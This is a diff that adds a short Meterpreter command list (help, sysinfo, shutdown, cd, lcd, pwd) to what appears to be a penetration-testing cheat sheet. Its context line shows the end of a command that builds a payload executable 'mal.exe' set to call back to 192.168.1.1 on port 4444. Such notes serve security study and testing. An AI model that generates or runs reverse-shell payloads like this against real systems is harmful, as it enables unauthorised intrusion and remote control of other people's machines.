@@ -125,3 +125,20 @@ exe LHOST=192.168.1.1 LPORT=4444 > mal.exe
 ```
 ***
 
+### Metasploit Meterpreter
+
+- ##### Base Commands: 
+
+    - `? / help` : Display a summary of commands exit / quit: Exit the Meterpreter session
+
+    - `sysinfo`: Show the system name and OS type
+
+    - `shutdown / reboot` : Self-explanatory
+
+- ##### File System Commands:
+
+    - `cd` : Change directory
+
+    - `lcd` : Change directory on local (attacker's) machine
+
+    - `pwd / getwd` : Display current working directory
